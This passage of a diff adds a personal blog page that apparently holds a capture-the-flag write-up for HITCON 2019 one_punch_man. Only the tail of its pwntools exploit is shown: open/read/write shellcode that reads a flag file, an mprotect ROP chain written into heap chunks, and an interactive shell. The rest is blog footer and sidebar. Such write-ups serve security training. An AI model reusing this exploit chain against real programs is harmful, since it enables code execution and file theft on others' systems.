class="line">flag_addr=heap_base+<span class="number">0x1d10</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;0&#125;</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, &#123;1&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, &#123;2&#125;</span></span><br><span class="line"><span class="string">mov rdx,0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> .<span class="built_in">format</span>( flag_addr,heap_base+<span class="number">0x48f0</span>,heap_base+<span class="number">0x48f0</span>)</span><br><span class="line">rename(<span class="number">1</span>,asm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">shellcode_addr=heap_base+<span class="number">0x44e0</span></span><br><span class="line">mprotect_rop=p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x6000</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(mprotect_addr)+p64(shellcode_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">rename(<span class="number">0</span>,mprotect_rop)</span><br><span class="line">rop_addr=heap_base+<span class="number">0x4b10</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">300</span>)</span><br><span class="line">rename(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(rop_addr)+p64(ret))</span><br><span class="line"></span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%ACn%E5%A4%A9%E3%80%81/" rel="prev" title="操作系统第n天、">
+      <i class="fa fa-chevron-left"></i> 操作系统第n天、
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#setcontext-mprotect-orw"><span class="nav-number">1.</span> <span class="nav-text">setcontext+mprotect+orw</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#setcontext"><span class="nav-number">1.1.</span> <span class="nav-text">setcontext</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">1.2.</span> <span class="nav-text">orw</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HITCON-2019-one-punch-man"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">HITCON 2019 one_punch_man</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
